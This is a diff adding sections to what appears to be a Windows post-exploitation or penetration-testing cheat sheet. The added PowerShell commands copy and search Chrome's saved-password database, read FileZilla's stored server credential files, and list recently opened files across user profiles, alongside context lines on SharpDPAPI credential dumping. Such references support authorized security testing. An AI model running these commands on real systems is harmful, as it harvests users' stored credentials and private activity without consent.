@@ -477,6 +477,35 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 .\SharpDPAPI.exe credentials
 ```
 
+**Chrome saved passwords (manual path):**
+
+```powershell
+# SQLite DB — copy it first (Chrome locks the file when running)
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\chrome_logins
+# Parse with a SQLite browser or strings
+strings "C:\Windows\Temp\chrome_logins" | findstr /i "http password"
+```
+
+### FileZilla
+
+```powershell
+type "$env:APPDATA\FileZilla\recentservers.xml"
+type "$env:APPDATA\FileZilla\sitemanager.xml"
+Get-ChildItem "$env:APPDATA\FileZilla\" -ErrorAction SilentlyContinue
+```
+
+### Recently Accessed Files
+
+```powershell
+# Shell:recent shortcut
+Get-ChildItem "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Recent\" |
+    Sort-Object LastWriteTime -Descending | Select-Object -First 20 Name, LastWriteTime
+
+# All users (if readable)
+Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\" -ErrorAction SilentlyContinue |
+    Sort-Object LastWriteTime -Descending | Select-Object -First 30 FullName, LastWriteTime
+```
+
 ### PuTTY / WinSCP / RDP Sessions
 
 ```powershell
